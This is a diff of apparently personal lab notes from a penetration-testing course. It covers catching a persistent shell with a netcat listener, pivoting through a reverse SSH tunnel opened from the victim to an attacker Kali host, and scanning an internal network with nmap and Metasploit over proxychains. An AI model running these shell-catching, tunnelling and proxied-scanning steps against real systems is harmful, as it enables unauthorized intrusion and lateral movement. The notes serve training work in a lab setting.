@@ -1,41 +1,59 @@
-[From Day 11]
+#Changing Targets VICTIM 2
 
-### THIS IS THE START TO INTERACTING WITH A NEW TARGET
-CATCH PERSISTENT SHELL
-(ATTACKER) nc -lvp 55556
+## Introduction
+
+Here You will find techniques PERSISTENT SHELL, PIVIOT, AND PING SWEEP.
+
+## Section 1: CATCH PERSISTENT SHELL
+
+### (ATTACKER)
+
+```bash
+# nc -lvp 55556
 upgrade shell
 
-### NEXT CONDUCT A PIVIOT
 
-(ATTACKER)(TERM 1) netstat -natp (SHOULD SEE YOUR PORT AND ESTABLISHED)
-(ATTACKER)(TERM 1) netstat -natp | grep LISTEN (OUTPUT SHOULD BE 9080 QUAD 0* LISTEN)
+## NEXT CONDUCT A PIVIOT
 
-AFTER CATCHING PERSISTENT SHELL (USE YOUR SSH PORT)
-OPEN SSH FOR LISTNER TO SET UP PROXY
+### (ATTACKER)
 
-(ATTACKER)(TERM 1) sudo systemctl status ssh.service > CTL + C (CHECK/CHANGE/CHECK)
-(ATTACKER)(TERM 1) sudo systemctl start ssh.service
-(ATTACKER)(TERM 1) REPEAT LINE 11 FOR (CHECK/CHANGE/CHECK)
+```bash
+# netstat -natp 
+# netstat -natp | grep LISTEN 
 
-(VICTIM) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555 
+_AFTER CATCHING PERSISTENT SHELL (USE YOUR SSH PORT)
+_OPEN SSH FOR LISTNER TO SET UP PROXY
+
+```bash
+#sudo systemctl status ssh.service
+#sudo systemctl start ssh.service
+
+### (VICTIM)
+```bash
+ # ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555 
+
 (MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
 if it states port fowarding failed it means you alrady have ypur proxy open
 (VICTIM) should be promted a password
 
-### NEXT CONDUCT A PING SWEEP
+## NEXT CONDUCT A PING SWEEP
 
-NOTE: YOUR DIRECTORIES MAY VARY COMPARED TO MY EXAMPLE DEPENDING HOW AND WHERE YOUR SCOPE FILE IS ON KALI
-(ATTACKER)(TERM 2) LS 
-(ATTACKER)(TERM 2)CD INTERNAL
-(SHOULD SEE IP'S PING SWEEPS AND TARGETS) 
-(ATTACKER)(TERM 2)LS 
-CD 192.168.1.102 (=SOC4)
-(ATTACKER)(TERM 2) sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan
-[DONT USE SKIP] (ATTACKER)(TERM 2) sudo proxychains nmap -iL scope -sV -Pn -sT | tee service_scan [1:19:52] 
+_NOTE: YOUR DIRECTORIES MAY VARY COMPARED TO MY EXAMPLE DEPENDING HOW AND WHERE YOUR SCOPE FILE IS ON KALI
 
-(ATTACKER)(TERM 3) sudo proxychains msfconsole [1:24:44]
+### (ATTACKER)
+```bash
+# LS 
+# CD INTERNAL
+_(SHOULD SEE IP'S PING SWEEPS AND TARGETS) 
+# LS 
+# CD 192.168.1.102 (=SOC4)
+# sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan
 
-[[[[continued... on Metasploit through proxy chains]]]]
+_USE A THIRD TERMINAL
+```bash
+ # sudo proxychains msfconsole [1:24:44]
+
+*** continued... on Metasploit through proxy chains ***
 
 
 
